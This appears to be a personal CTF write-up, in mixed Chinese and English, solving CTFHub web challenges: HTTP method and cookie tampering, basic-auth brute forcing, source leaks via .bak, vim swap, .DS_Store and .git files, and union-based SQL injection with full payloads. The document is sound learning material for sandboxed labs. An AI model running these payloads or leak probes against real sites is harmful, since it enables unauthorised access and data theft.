
so we need to access it with CTFHUB method

postman cannot alter the respuest methods, so pass

##### method1:burpsuite

burpsuite, open interceptor,use the burpsuite browser to open the page,
you can get a requeat message with the GET in the front, just change it
to CTFHUB

you\'ll get

```    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8"/>
        <title>CTFHub HTTP Method</title>
    </head>
    <body>

    good job! ctfhub{54531dae3ab7971c27d03aa4}

    </body>
    </html>
```
##### method2:curl

```    curl -X CTFHUB http://challenge-760bed670c370d4e.sandbox.ctfhub.com:10800/index
```
curl: - -A: add User-Agent - -b: sent cookie - -c: write the server
cookie into a file - -d: POST data - \...

https://www.ruanyifeng.com/blog/2019/09/curl-reference.html

#### 302 jump

```    <html><head>
            <title>No Flag here!</title>
        </head>
        <body>
            <center>
                <h1>No Flag here!</h1>
                <a href="index.php">Give me Flag</a>
            </center>

    </body></html>
```
intercept with burpsuite to get favicon.ico wiht 302, and index.php with
304,we know the flag is at index.php following the a tags,curl

curl
http://challenge-5d15d0c1bc151f83.sandbox.ctfhub.com:10800/index.php

burpsuite:

check html history to get a 302 history to index.php

```    HTTP/1.1 200 OK
    Server: openresty/1.21.4.2
    Date: Sun, 20 Oct 2024 14:07:40 GMT
    Content-Type: text/html; charset=UTF-8
    Connection: keep-alive
    X-Powered-By: PHP/5.6.40
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Headers: X-Requested-With
    Access-Control-Allow-Methods: *
    Content-Length: 172

    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8"/>
        <title>CTFHub HTTP Method</title>
    </head>
    <body>

    good job! ctfhub{deac5970cfc8f698bb842ef0}

    </body>
    </html>
```
#### cookie:

题目说了只有admin才能访问,在cookie里找到admin变量是0,所以发送一个admin=1的请求就行了

```    curl --cookie "admin=1" http://challenge-958ac43d994c8238.sandbox.ctfhub.com:10800/
```
burpsuite同理

#### 基础认证

给了一个密码本,由于html里认证本质就是设置一个Authorization的Header,所以可以直接curl写个bash挨个试

或者可以先用burpsuite抓包,然后把抓到的包发给interceptor解析

能看出Authorization就是Basic + base64字符串,其中base64是账号:密码

猜测账户admin

然后用burpsuite挨个爆破,状态码200的就是正确密码

#### 响应包源代码:

代开源代码,花到最底下,结束

### 信息泄露

#### 目录遍历:

挨个翻一遍就好了

#### PHPINFO:

进入网页,ctrl+F搜ctfhub就出来了

#### 网站源码:

根据给出的提示burpsuite爆破,找到一个压缩包,然后在网址后面输入那个txt文件的名字就行了

#### bak文件:

提示说在index.php里,所以看下index.php,题目是bak,再加个bak后缀名就出来了

#### vim缓存

**当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim
编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。**

后缀是区分这些交换文件的方法同一个文件产生的多个交换文件的后缀是不一样的

以 index.php 为例：第一次产生的交换文件名为 .index.php.swp

再次意外退出后，将会产生名为 .index.php.swo 的交换文件

第三次产生的交换文件则为 .index.php.swn

所以在url后面加上.index.php.swp即可

#### DS_Store

这个是mac的缓存,在url后面加上/.DS_Store得到一个文件,然后用记事本打开,的带一个txt文件名,放在url后面就行了

#### git

##### git log:

可以先用dirsearch搜一遍,但肯定能找到git泄露

然后用githack,记得用python2(conda装个py27)

然后就把对应的repo clone下来了,git log去查commit记录, 然后git
diff或者git show(因为flag是这次commit加上去的)

##### git stash:

和之前一样,把repo弄下来然后git stash pop就出来了

##### git index:

和git log一样

### svn:

用dvcs获取.svn文件夹,然后能找到可疑文件,grep -a -r flag

### hg:

同理

## 密码类:

burpsuite抓包硬试

## sql注入

这类问题说白了就是没有设置好sql的空里写什么

### 整数型注入

如果在不知道题目的情况下可以先输入1试试

显示sql语句

```    select * from news where id = 1
    -- ID: 1
    -- Data: ctfhub
```
```    select * from news where id = 2
    -- ID: 2
    -- Data: skill
```
于是知道这道题是整数型注入

查询字段数

```    select * from news where id = 1 or 1 = 1 order by 2
```
其中

```    order by 1
    order by 2
    order by 3
    ...
```
表示按照第几个字段排序,所以可以用来检查字段数

order by 3 的时候不回显,所以有两个字段

然后用union select联合查询回显位置

```    select * from news where id = 1 union select 1,2
```
select 1,2 正常来说只会返回第一列是1,第二列是2,列数和数据库列数相同的表

返回

```    select * from news where id= 1 union select 1,2
    -- ID: 1
    -- Data: ctfhub
```
很明显,这个是因为ctfhub的id=1,所以改成不可能出现在数据库里的id,比如-1,来阻止表内数字出现

```    select * from news where id=-1 union select 1,2
    --ID: 1
    --Data: 2
```
we know there is only two item in one row, we get the name of the
database, usually we can get this by calling Database()

so

```    select * from news where id=-1 union select 1,Database()
    --ID: 1
    --Data: sqli
```
so we know the name of the sql is sqli

then we want to find the columns

databases like Mysql has built-in information schema in default, is a
database

we can check for all the databases available, so we call for
information_schema.schemata, this is also what the sql is doing when
executing show databases

and since the website only displays one row, we have to concat them
together to view all of them

so

```    select * from news where id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli'
    -- ID: 1
    -- Data: flag, news
```
then we want to look at the flag table

```    select * from news where id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli' and table_name='flag'
    -- ID: 1
    -- Data: flag
```
we know that flag is in the flag table

we do

```    select * from news where id=-1 union select 1,group_concat(flag) from sqli.flag
    -- ID: 1
    -- Data: ctfhub{4f5e458ba1386c1b56f67254}
```
### string sql injection

this is similar

the only thing to keep in mind is that there is a \' in the end, but you
can use comments to get rig of that

the rest is basically the same
::::::::::::::::::::
::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::
